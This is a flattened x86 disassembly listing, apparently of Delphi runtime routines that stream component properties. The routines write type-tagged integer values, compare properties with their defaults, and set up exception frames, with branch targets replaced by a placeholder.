mov eax ebx
call sub_42b240
pop ebx
pop ebp
retn 0x8
sub_42ba9c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx r-xdata
mov eax esi
call sub_43501c
test al al
je r-xdata
mov edx r-xdata
mov eax esi
call sub_43501c
test al al
je r-xdata
mov dl 0x8
mov eax ebx
call sub_42d794
pop esi
pop ebx
retn
mov edx r-xdata
mov eax esi
call sub_43501c
test al al
je r-xdata
mov dl 0x9
mov eax ebx
call sub_42d794
jmp r-xdata
mov edx r-xdata
mov eax esi
call sub_43501c
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_42d794
jmp r-xdata
pop esi
pop ebx
retn
mov dl 0x7
mov eax ebx
call sub_42d794
mov edx esi
mov eax ebx
call sub_42d6b8
mov dl 0xd
mov eax ebx
call sub_42d794
jmp r-xdata
sub_42bb80
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_42d794
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_42b240
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_42d794
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_42b240
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_42d794
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_42b240
jmp r-xdata
pop edx
pop ebx
retn
sub_42bbf4
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov dl 0x13
mov eax ebx
call sub_42d794
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_42b240
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ebx
call sub_42bb80
jmp r-xdata
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_42bc5c
push ebx
push esi
push ecx
mov esi ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ r-xdata ]
cmp al [ esp ]
je r-xdata
pop edx
pop esi
pop ebx
retn
movzx eax [ esp ]
or al 0xf0
mov [ esp + 0x1 ] al
lea edx [ esp + 0x1 ]
mov ecx 0x1
mov eax ebx
call sub_42b240
test [ esp ] 0x2
je r-xdata
mov edx esi
mov eax ebx
call sub_42bb80
sub_42bca4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_44843c
call sub_42f6b8
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
add eax eax
add eax eax
call sub_44748c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42bd53
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_44843c
mov edx [ ebp - 0x10 ]
call sub_42fa58
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0xc ]
add edx edx
add edx edx
mov eax [ ebp - 0x10 ]
call sub_4474a8
retn
inc esi
xor edi edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_42faac
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42cdfc
mov eax [ ebp - 0x10 ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
sub_42bd84
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42fadc
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax 0x80000000
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_42fadc
cmp ebx eax
sete al
pop ebx
pop ebp
retn
xor eax eax
jmp r-xdata
cmp eax ebx
je r-xdata
pop ebx
pop ebp
retn
mov al 0x1
sub_42bddc
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4304c4
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
sete al
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4304c4
fld [ ebp - 0x10 ]
fcompp
fwait
fnstsw ax
sahf
sete al
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_42be38
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4308e0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4308e0
cmp edx [ ebp - 0x4 ]
jne r-xdata
sete al
cmp [ ebp - 0x8 ] 0x0
sete al
jmp r-xdata
cmp eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42be90
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_42bf0f
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_430098
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
call j_sub_449be8
sete bl
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_430098
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call j_sub_449be8
sete bl
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bf16
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4499f0
retn
sub_42bf20
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_43501c
test al al
jne r-xdata
mov al 0x1
sub_42bf60
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
sete al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_42fadc
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_42bf20
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
sub_42bfb8
push ebp
mov ebp esp
push ecx
push ebx
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42fadc
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
push ebp
call sub_42bf60
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
push ebp
call sub_42bf60
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
sub_42c038
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_42c0e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
sete bl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c0eb
lea eax [ ebp - 0x8 ]
call sub_44b8d8
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_430944
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0x4 ]
sete bl
test bl bl
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_43bff8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_42bf20
pop ecx
mov ebx eax
sub_42c104
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_42c1c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_430944
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_43bff8
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c1c8
lea eax [ ebp - 0x10 ]
call sub_44b8d8
lea eax [ ebp - 0xc ]
call sub_44b8d8
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_430944
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
call sub_42c038
pop ecx
test al al
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
sub_42c1e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov eax ebx
xor edx edx
call sub_449d2c
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xa ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
push ebx
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
lea ecx [ ebp - 0x8 ]
mov eax [ esi + 0x4 ]
call [ esi ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov ecx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_4485b4
sub_42c238
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_42c2c7
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_430868
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp ebx [ ebp - 0x8 ]
je r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_430868
mov ebx [ ebp - 0x10 ]
mov al 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
call sub_42c1e0
pop ecx
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c2ce
lea eax [ ebp - 0x14 ]
call j_sub_449348
retn
sub_42c2d8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_42c35f
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4307e8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_444f00
mov ebx eax
lea ecx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4307e8
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_444f74
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c366
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_44a7e8
retn
sub_42c370
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_42bd6c
mov [ ebp - 0x9 ] al
mov bl 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
movzx eax [ eax + lookup_table_42c43c ]
jmp [ eax * 4 + jump_table_42c44f ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42fadc
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
push ebp
call sub_42bd84
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_42bddc
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_42be90
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_42bfb8
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_42c238
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_42c2d8
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_42be38
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_42c104
pop ecx
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42fadc
test [ eax + 0x24 ] 0x4
je r-xdata
sub_42c4d4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_42c51f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
lea ebx [ eax + 0x1a ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44bd80
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_42d334
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c526
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_42c52c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_42c5b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_42f6b8
mov eax [ eax + 0x1 ]
mov edi [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov dl 0xb
call sub_42d794
xor ebx ebx
jae r-xdata
bt esi eax
inc ebx
cmp ebx 0x20
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_42fbac
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42d6b8
mov eax ebx
cmp eax 0x1f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_42d398
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c5b9
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_42c5c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_42c620
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_423ef8
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_42bb80
lea edx [ ebp - 0x4 ]
mov eax esi
call ebx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_42ba9c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c627
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_42c62c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42c6c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
call sub_42c4d4
pop ecx
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0x2c ]
call sub_449d80
xor eax eax
push ebp
push sub_42c6a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2c
xor edx edx
call sub_449d2c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_42b3e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c6ae
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_449d2c
retn
sub_42c6d0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_42c7ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_42fadc
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_42c4d4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
movzx eax [ eax ]
cmp eax 0x9
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c7c1
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
jmp [ eax * 4 + jump_table_42c71a ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov eax [ eax ]
mov edx ebx
call sub_42c5c0
pop ecx
jmp r-xdata
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42b340
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_42b390
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_42c52c
pop ecx
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_42f6c4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42ba9c
sub_42c7c8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4304c4
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
push eax
call sub_42c4d4
pop ecx
movzx eax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42ba0c
mov esp ebp
pop ebp
retn
sub_42c808
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4308e0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_42c4d4
pop ecx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42bbf4
pop ecx
pop ecx
pop ebp
retn
sub_42c844
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_42c8ae
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_430098
mov eax [ ebp + 0x8 ]
push eax
call sub_42c4d4
pop ecx
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_449f7c
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42d78c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c8b5
lea eax [ ebp - 0x8 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call sub_4499d8
retn
sub_42c8d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42c9c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_449d2c
jmp r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
mov edx r-xdata
call sub_449d2c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c9cc
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_449d2c
mov eax esi
mov ecx r-xdata
mov edx [ ebx + 0x8 ]
call sub_44a0e8
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x1c ]
mov eax edi
call sub_42c8bc
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_44a1b8
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_42c8d4
pop ecx
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_44a1b8
jmp r-xdata
sub_42ca18
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_42cc0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_42fadc
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_42c4d4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov dl 0xd
call sub_42d794
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cc16
lea eax [ ebp - 0xc ]
mov edx 0x3
call j_sub_44936c
retn
mov eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0x2c ]
call sub_449d80
xor eax eax
push ebp
push sub_42cb90
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
lea ebx [ eax + 0x1a ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_44bd80
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push [ eax + 0x2c ]
push [ ebp - 0xc ]
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2c
mov edx 0x3
call sub_44a1b8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_42bca4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_449d2c
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x20 ]
call sub_42fadc
